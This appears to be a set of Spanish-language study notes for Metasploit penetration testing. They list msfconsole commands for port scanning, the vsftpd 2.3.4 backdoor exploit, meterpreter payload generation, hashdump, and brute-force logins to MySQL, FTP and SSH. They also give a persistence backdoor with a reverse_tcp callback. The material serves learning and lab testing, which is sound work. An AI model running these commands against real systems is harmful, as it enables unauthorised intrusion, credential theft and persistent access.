# Metasploit 

Metasploit es un framework para pentest y ataque.  
Tiene varias herramientas incorporadas.  

## Explotación

En Kali Linux : `/usr/share/metasploit-framework/`  

Comandos basicos  
```
service postgresql start
msfdb init
msfconsole
help
help search
search name:wordpress
searc portscan type:auxiliary  
```

Ejemplo:  
```
msfconsole -q
msf > use auxiliary/scanner/portscan/tcp
info
show options
show advanced
show targets
show evasion 
show payloads 
set RHOST 10.10.2.14
set PORTS 20-500
run
```

Payloads:  
`/usr/share/metasploit-framework/modules/payloads/`  

```
msfconsole -q
msf > use payload/windows/meterpreter/bind_tcp
show options
set RHOST ip
get RHOST
#unset RHOST
setg RHOST ip #global
getg RHOST
set LPORT 20-500
generate
```

Exploits:  
`/usr/share/metasploit-framework/modules/exploits/`  

```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST ip
exploit

whoami
id ....
background
```

Encoders:  
`/usr/share/metasploit-framework/modules/encoders/`  

```
msf > show encoders
```

Post:  
`/usr/share/metasploit-framework/modules/post/`  

Primero se ejecuta un exploit por ejemplo con `exploit -j`  
Y queda corriendo una sesion que se puede ver con `sessions`  

Luego:  
```
msf > use post/linux/gather/hashdump
show options
set SESSION [NUMERO DE SESION]
exploit
```

Oneliner  
```
msfconsole -x "use exploit/unix/ftp/vsftp_234_backdoor; set RHOST 10.10.2.14; exploit -j"
msf xxxx > 
sessions
sessions -i 1
#start shell
uname -a
ifconfig
bg
```

Nmap
```
smf> search portscan type:aurixiliary
use auxiliary/scanner/portscan/syn
show options
set RHOST 10.10.2.10,14
run
```

MySQL:  
Primero buscar en gooogle y descargar lista de passwords de mysql.  
```
msf> services -h
services -p 3306
search mysql type:auxiliary
use auxiliary/scanner/mysql/mysql_version
show options 
setg RHOST 10.10.2.10,14
run

use auxiliary/scanner/mysql/mysql_login
show options
set BLANK_PASSWORDS true
set USERPASS_FILE Desktop/mysqlpass.txt
run
```

FTP  
```
msf> search name:ftp type:auxiliary
services -p 21
services -s ftp
use auxiliary/scanner/ftp/ftp_version
show options
run
#search version in google, to find vuln
back
use auxiliary/scanner/ftp/ftp_login
show options
set BLANK_PASSWORDS true
set USER_AS_PASS true
set USERPASS_FILE Destop/ftppass.txt
run
pushm
use auxiliary/scanner/ftp/anonymous
show options
run
```

SSH  
```
msf> search name:ssh type:auxiliary
use auxiliary/scanner/ssh/ssh_version
show options
run

pushm
use auxiliary/scanner/ssh/ssh_login
set USER_AS_PASS true
set BLANK_PASSWORDS true
set USERPASS_FILE Destop/ftppass.txt
run
```

## Post Explotación  
Mantener el accesso.  
Despues de ejecutar un exploit y estar dentro del sistema: 

```
meterpreter> sysinfo
run persistence -h
run persistence -A -P windows/meterpreter/reverse_tcp -X -i 10 -p 5555 -r 172.16.99.222 #victim ip
background
sessions 
sessions -i X 
sysinfo
sessions -l
```

Luego hay remover backdoor.  
Habria q borrar el archivo del path remoto, remover linea de regedit tambien si lo fuera, etc.  





